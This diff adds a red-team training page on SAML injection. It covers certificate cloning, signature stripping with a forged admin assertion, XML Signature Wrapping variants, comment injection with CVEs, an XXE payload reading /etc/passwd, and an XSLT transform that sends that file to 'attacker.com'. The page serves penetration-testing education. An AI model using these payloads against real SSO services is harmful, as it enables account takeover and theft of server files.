@@ -1,0 +1,194 @@
+---
+layout: training-page
+title: "SAML Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - saml
+  - sso
+  - xml-signature-wrapping
+  - authentication-bypass
+  - xxe
+page_key: "web-saml-injection"
+---
+<h1>SAML Injection</h1>
+<p>
+  SAML (Security Assertion Markup Language) is the protocol behind many Single Sign-On (SSO)
+  implementations. A SAML assertion is an XML document asserting a user's identity, signed by
+  an Identity Provider (IdP) and consumed by a Service Provider (SP). Vulnerabilities arise from
+  improper signature verification, XML parsing quirks, and missing validation — allowing attackers
+  to forge assertions, authenticate as arbitrary users, or extract server-side files.
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>SAMLRaider — Burp Suite extension for SAML testing — <code>github.com/SAMLRaider/SAMLRaider</code></li>
+  <li>d0ge/XSW — XML Signature Wrapping Burp extension — <code>github.com/d0ge/XSW</code></li>
+  <li>ZAP SAML Support addon — detect, edit, fuzz SAML requests</li>
+</ul>
+
+<h2>SAML Response Structure</h2>
+<pre><code>&lt;samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"&gt;
+  &lt;saml:Issuer&gt;https://idp.example.com&lt;/saml:Issuer&gt;
+  &lt;samlp:Status&gt;
+    &lt;samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/&gt;
+  &lt;/samlp:Status&gt;
+  &lt;saml:Assertion&gt;
+    &lt;saml:Subject&gt;
+      &lt;saml:NameID&gt;user@example.com&lt;/saml:NameID&gt;
+    &lt;/saml:Subject&gt;
+    &lt;ds:Signature&gt;...&lt;/ds:Signature&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/samlp:Response&gt;</code></pre>
+
+<h2>Attack Techniques</h2>
+
+<h3>Invalid Signature (Certificate Cloning)</h3>
+<p>
+  If the SP validates the signature but does not verify the certificate chain (e.g., accepts
+  self-signed certificates), an attacker can clone the certificate or create their own self-signed
+  cert to sign a forged assertion. Steps:
+</p>
+<ol>
+  <li>Capture a real SAML response and extract the certificate</li>
+  <li>Generate a new self-signed certificate with the same subject details</li>
+  <li>Forge an assertion with <code>NameID=admin</code> and sign it with the new certificate</li>
+  <li>Submit the forged assertion</li>
+</ol>
+
+<h3>Signature Stripping</h3>
+<p>
+  In some default configurations, if the <code>&lt;ds:Signature&gt;</code> block is entirely
+  omitted from the SAML response, the SP skips signature verification. The SP accepts any unsigned
+  assertion — effectively accepting a username without checking the password.
+</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Destination="http://sp.example.com/acs" ID="id1234" Version="2.0"&gt;
+  &lt;saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"&gt;REDACTED&lt;/saml2:Issuer&gt;
+  &lt;saml2p:Status&gt;
+    &lt;saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/&gt;
+  &lt;/saml2p:Status&gt;
+  &lt;saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id5678" Version="2.0"&gt;
+    &lt;saml2:Subject&gt;
+      &lt;saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"&gt;admin&lt;/saml2:NameID&gt;
+      &lt;saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"&gt;
+        &lt;saml2:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00.000Z"
+          Recipient="http://sp.example.com/acs"/&gt;
+      &lt;/saml2:SubjectConfirmation&gt;
+    &lt;/saml2:Subject&gt;
+    &lt;!-- Signature block intentionally omitted --&gt;
+  &lt;/saml2:Assertion&gt;
+&lt;/saml2p:Response&gt;</code></pre>
+
+<h3>XML Signature Wrapping (XSW) Attacks</h3>
+<p>
+  XSW attacks exploit the mismatch between which XML element is validated (signed) and which
+  element is actually processed by the application. The SP verifies the signature over the
+  Legitimate Assertion (LA) but processes the Forged Assertion (FA) because of ambiguous
+  element selection logic.
+</p>
+<pre><code>&lt;SAMLResponse&gt;
+  &lt;!-- FA: Forged Assertion (unsigned, processed by vulnerable SP) --&gt;
+  &lt;Assertion ID="evil"&gt;
+    &lt;Subject&gt;admin&lt;/Subject&gt;
+  &lt;/Assertion&gt;
+
+  &lt;!-- LA: Legitimate Assertion with valid signature --&gt;
+  &lt;Assertion ID="legitimate"&gt;
+    &lt;Subject&gt;normaluser&lt;/Subject&gt;
+    &lt;Signature&gt;
+      &lt;Reference URI="legitimate"/&gt;  &lt;!-- signs the legitimate assertion --&gt;
+    &lt;/Signature&gt;
+  &lt;/Assertion&gt;
+&lt;/SAMLResponse&gt;</code></pre>
+
+<p>The 8 XSW variants (automate with SAMLRaider):</p>
+<ul>
+  <li><strong>XSW1</strong> — add cloned unsigned Response copy after the existing signature</li>
+  <li><strong>XSW2</strong> — add cloned unsigned Response copy before the existing signature</li>
+  <li><strong>XSW3</strong> — add cloned unsigned Assertion before the existing Assertion</li>
+  <li><strong>XSW4</strong> — add cloned unsigned Assertion inside the existing Assertion</li>
+  <li><strong>XSW5</strong> — change signed Assertion value; append original with signature removed at end</li>
+  <li><strong>XSW6</strong> — change signed Assertion value; append original with signature removed after original signature</li>
+  <li><strong>XSW7</strong> — add an Extensions block with a cloned unsigned Assertion</li>
+  <li><strong>XSW8</strong> — add an Object block containing a copy of the original Assertion without its signature</li>
+</ul>
+
+<h3>XML Comment Injection</h3>
+<p>
+  Some SAML libraries parse the <code>NameID</code> value differently when XML comments are
+  present. Injecting a comment inside the username can cause the application to authenticate as
+  a different user while the signature remains valid over the full NameID string.
+</p>
+<pre><code>&lt;NameID&gt;user@legitimate.com&lt;!--XMLCOMMENT--&gt;.evil.com&lt;/NameID&gt;
+&lt;!-- Application sees: user@legitimate.com (comment stripped during processing) --&gt;
+&lt;!-- But signature was over: user@legitimate.com&lt;!--XMLCOMMENT--&gt;.evil.com --&gt;</code></pre>
+<p>Affected libraries (CVEs):</p>
+<ul>
+  <li>OneLogin python-saml — CVE-2017-11427</li>
+  <li>OneLogin ruby-saml — CVE-2017-11428</li>
+  <li>Clever saml2-js — CVE-2017-11429</li>
+  <li>OmniAuth-SAML — CVE-2017-11430</li>
+  <li>Shibboleth — CVE-2018-0489</li>
+  <li>Duo Network Gateway — CVE-2018-7340</li>
+</ul>
+
+<h3>XML External Entity (XXE) in SAML</h3>
+<p>
+  If the SP's XML parser processes external entities, the SAML response can be weaponized to
+  read server-side files or trigger SSRF. The entity is defined in a DOCTYPE declaration and
+  referenced in an attribute value — the signature remains valid because the content does not
+  change until the entity is resolved during parsing.
+</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE Response [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;saml2p:Response ...&gt;
+  ...
+  &lt;saml2:AttributeValue&gt;&amp;xxe;&lt;/saml2:AttributeValue&gt;
+  ...
+&lt;/saml2p:Response&gt;</code></pre>
+
+<h3>XSLT Injection via Transform Element</h3>
+<p>
+  Some SAML implementations allow XSLT transforms inside the <code>ds:Signature</code> block.
+  A malicious transform can read local files and exfiltrate them to the attacker.
+</p>
+<pre><code>&lt;ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"&gt;
+  &lt;ds:SignedInfo&gt;
+    &lt;ds:Transforms&gt;
+      &lt;ds:Transform&gt;
+        &lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+          &lt;xsl:template match="doc"&gt;
+            &lt;xsl:variable name="file" select="unparsed-text('/etc/passwd')"/&gt;
+            &lt;xsl:variable name="escaped" select="encode-for-uri($file)"/&gt;
+            &lt;xsl:variable name="url" select="concat('http://attacker.com/', $escaped)"/&gt;
+            &lt;xsl:value-of select="unparsed-text($url)"/&gt;
+          &lt;/xsl:template&gt;
+        &lt;/xsl:stylesheet&gt;
+      &lt;/ds:Transform&gt;
+    &lt;/ds:Transforms&gt;
+  &lt;/ds:SignedInfo&gt;
+&lt;/ds:Signature&gt;</code></pre>
+
+<h2>Testing Checklist</h2>
+<ul>
+  <li>Capture a valid SAML response in Burp and base64-decode the SAMLResponse parameter</li>
+  <li>Modify the NameID to a target username and re-submit (tests missing signature verification)</li>
+  <li>Remove the entire Signature block and re-submit (tests signature stripping)</li>
+  <li>Run all 8 XSW variants with SAMLRaider</li>
+  <li>Inject an XML comment inside the NameID value</li>
+  <li>Add a DOCTYPE with file-reading XXE entities</li>
+  <li>Check if the NotOnOrAfter condition is validated (try setting it far in the future)</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings SAML Injection — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection</code></li>
+  <li>SAMLRaider Burp Extension — <code>github.com/SAMLRaider/SAMLRaider</code></li>
+  <li>On Breaking SAML: Be Whoever You Want to Be — Juraj Somorovsky et al., USENIX Security 2012</li>
+  <li>The road to your codebase is paved with forged assertions — Ioannis Kakavas (GitHub Enterprise SAML bug)</li>
+  <li>OWASP SAML Security Cheat Sheet — <code>github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md</code></li>
+  <li>How to Hunt Bugs in SAML (3-part series) — Ben Risher (@epi052)</li>
+</ul>
